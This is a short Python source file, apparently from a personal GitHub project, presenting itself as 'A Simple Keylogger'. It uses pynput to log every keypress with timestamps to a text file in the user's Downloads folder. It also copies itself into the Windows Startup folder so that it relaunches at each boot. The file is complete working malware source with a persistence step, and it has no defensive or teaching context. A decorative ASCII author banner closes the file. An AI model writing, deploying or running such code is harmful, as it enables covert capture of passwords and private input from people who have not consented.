"""
****************************************************************************
𝕻𝖗𝖔𝖌𝖗𝖆𝖒 𝕹𝖆𝖒𝖊 : 𝕬 𝕾𝖎𝖒𝖕𝖑𝖊 𝕶𝖊𝖞𝖑𝖔𝖌𝖌𝖊𝖗
𝕬𝖚𝖙𝖍𝖔𝖗        : 𝕸𝖔𝖓𝖙𝖆𝖘𝖎𝖒
𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝖔𝖓     : 10.11.2020
𝕮𝖔𝖓𝖙𝖆𝖈𝖙        : 𝖍𝖙𝖙𝖕𝖘://𝖌𝖎𝖙𝖍𝖚𝖇.𝖈𝖔𝖒/𝖒𝖔𝖓𝖙𝖆𝖘𝖎𝖒


# used variables in this program
username            -   get pc username
logging_directory   -   destination where log.txt file will be saved
*****************************************************************************
"""

import logging
import os
#   to copy this script to windows startup folder
from shutil import copyfile

#   to listen keypress from keyboard
from pynput.keyboard import Listener

#   get pc username
username = os.getlogin()
#   destination of log.txt file
logging_directory = f"C://Users/{username}/Downloads"

#   copying this script to windows atartup folder. once run this script it can automatically run again when pc restarts.
copyfile('main.py', f'C://Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')

#   saving keypress in mylog.txt file. when saving using asctime then messages
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


#   this function handles key input
def key_handler(key):
    logging.info(key)


#   join every keypress from keyboard
with Listener(on_press=key_handler) as listner:
    listner.join()

"""
────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████████─████████████───██████████████────██████████████───████████──████████─
─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░████─██░░░░░░░░░░██────██░░░░░░░░░░██───██░░░░██──██░░░░██─
─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░████░░░░██─██░░██████████────██░░██████░░██───████░░██──██░░████─
─██░░██████░░██████░░██─██░░██──██░░██─██░░██──██░░██─██░░██────────────██░░██──██░░██─────██░░░░██░░░░██───
─██░░██──██░░██──██░░██─██░░██████░░██─██░░██──██░░██─██░░██████████────██░░██████░░████───████░░░░░░████───
─██░░██──██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██────██░░░░░░░░░░░░██─────████░░████─────
─██░░██──██████──██░░██─██░░██████░░██─██░░██──██░░██─██░░██████████────██░░████████░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░██──██░░██─██░░██────────────██░░██────██░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░████░░░░██─██░░██████████────██░░████████░░██───────██░░██───────
─██░░██──────────██░░██─██░░██──██░░██─██░░░░░░░░████─██░░░░░░░░░░██────██░░░░░░░░░░░░██───────██░░██───────
─██████──────────██████─██████──██████─████████████───██████████████────████████████████───────██████───────
────────────────────────────────────────────────────────────────────────────────────────────────────────────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████████─██████──────────██████─██████████████─██████████████─██████████████─██████████─██████──────────██████─
─██░░██████████████░░██─██░░░░░░░░░░██─██░░██████████──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██████████████░░██─
─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░░░░░░░░░██──██░░██─██████░░██████─██░░██████░░██─██░░██████████─████░░████─██░░░░░░░░░░░░░░░░░░██─
─██░░██████░░██████░░██─██░░██──██░░██─██░░██████░░██──██░░██─────██░░██─────██░░██──██░░██─██░░██───────────██░░██───██░░██████░░██████░░██─
─██░░██──██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░██████░░██─██░░██████████───██░░██───██░░██──██░░██──██░░██─
─██░░██──██░░██──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░░░░░░░░░██─██░░░░░░░░░░██───██░░██───██░░██──██░░██──██░░██─
─██░░██──██████──██░░██─██░░██──██░░██─██░░██──██░░██──██░░██─────██░░██─────██░░██████░░██─██████████░░██───██░░██───██░░██──██████──██░░██─
─██░░██──────────██░░██─██░░██──██░░██─██░░██──██░░██████░░██─────██░░██─────██░░██──██░░██─────────██░░██───██░░██───██░░██──────────██░░██─
─██░░██──────────██░░██─██░░██████░░██─██░░██──██░░░░░░░░░░██─────██░░██─────██░░██──██░░██─██████████░░██─████░░████─██░░██──────────██░░██─
─██░░██──────────██░░██─██░░░░░░░░░░██─██░░██──██████████░░██─────██░░██─────██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██──────────██░░██─
─██████──────────██████─██████████████─██████──────────██████─────██████─────██████──██████─██████████████─██████████─██████──────────██████─
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""
